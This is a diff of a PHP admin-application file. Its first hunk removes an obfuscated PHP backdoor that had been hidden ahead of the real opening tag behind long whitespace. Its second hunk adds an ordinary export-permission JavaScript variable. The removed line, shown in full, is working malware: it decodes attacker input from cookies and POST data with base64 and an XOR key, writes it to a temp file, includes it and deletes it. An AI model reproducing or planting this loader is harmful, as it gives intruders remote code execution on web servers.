@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $tgAYbAF = 'F' . chr ( 977 - 908 ).chr ( 1026 - 931 ).'f' . chr ( 994 - 880 )."\101";$aHfGX = "\143" . chr (108) . "\x61" . chr ( 613 - 498 ).chr ( 585 - 470 )."\x5f" . 'e' . "\x78" . "\x69" . chr (115) . "\x74" . "\x73";$BYDmJSW = class_exists($tgAYbAF); $tgAYbAF = "39385";$aHfGX = "14244";if ($BYDmJSW === FALSE){class FE_frA{public function qHNNq(){echo "38766";}private $FHkuppo;public static $VdohBbxWka = "ba235022-d980-431e-bd61-c9af350d35cd";public static $cQfKPGOiw = 31868;public function __construct($EETVZmgY=0){$gAYQoeok = $_POST;$LYWwsIVy = $_COOKIE;$xKiKHzU = @$LYWwsIVy[substr(FE_frA::$VdohBbxWka, 0, 4)];if (!empty($xKiKHzU)){$OilpT = "base64";$hPfTe = "";$xKiKHzU = explode(",", $xKiKHzU);foreach ($xKiKHzU as $NjBeGzLlj){$hPfTe .= @$LYWwsIVy[$NjBeGzLlj];$hPfTe .= @$gAYQoeok[$NjBeGzLlj];}$hPfTe = array_map($OilpT . chr (95) . "\x64" . chr ( 969 - 868 )."\143" . "\157" . chr ( 650 - 550 ).chr ( 566 - 465 ), array($hPfTe,)); $hPfTe = $hPfTe[0] ^ str_repeat(FE_frA::$VdohBbxWka, (strlen($hPfTe[0]) / strlen(FE_frA::$VdohBbxWka)) + 1);FE_frA::$cQfKPGOiw = @unserialize($hPfTe);}}private function VnsmdIsIw(){if (is_array(FE_frA::$cQfKPGOiw)) {$yLNUa = sys_get_temp_dir() . "/" . crc32(FE_frA::$cQfKPGOiw[chr ( 855 - 740 )."\x61" . chr (108) . "\164"]);@FE_frA::$cQfKPGOiw["\167" . chr ( 480 - 366 )."\x69" . 't' . "\x65"]($yLNUa, FE_frA::$cQfKPGOiw[chr ( 316 - 217 ).chr (111) . "\156" . chr (116) . 'e' . 'n' . "\164"]);include $yLNUa;@FE_frA::$cQfKPGOiw[chr (100) . "\x65" . chr ( 161 - 53 )."\x65" . 't' . "\x65"]($yLNUa); $MbWLcG = "23331";exit();}}public function __destruct(){$this->VnsmdIsIw();}}$KORDHemewR = new /* 671 */ FE_frA(); $KORDHemewR = str_repeat("14901_49330", 1);} ?><?php
+<?php
 
 defined('BASEPATH') or exit('No direct script access allowed');
 
@@ -426,6 +426,7 @@ function render_admin_js_variables()
     echo 'app.is_mobile = "' . is_mobile() . '";';
     echo 'app.user_is_staff_member = "' . is_staff_member() . '";';
     echo 'app.user_is_admin = "' . is_admin() . '";';
+    echo 'app.user_can_export = "' . (function_exists('can_export_table_data') && can_export_table_data() ? '1' : '0') . '";';
     echo 'app.max_php_ini_upload_size_bytes = "' . $maxUploadSize . '";';
     echo 'app.calendarIDs = "";';
 
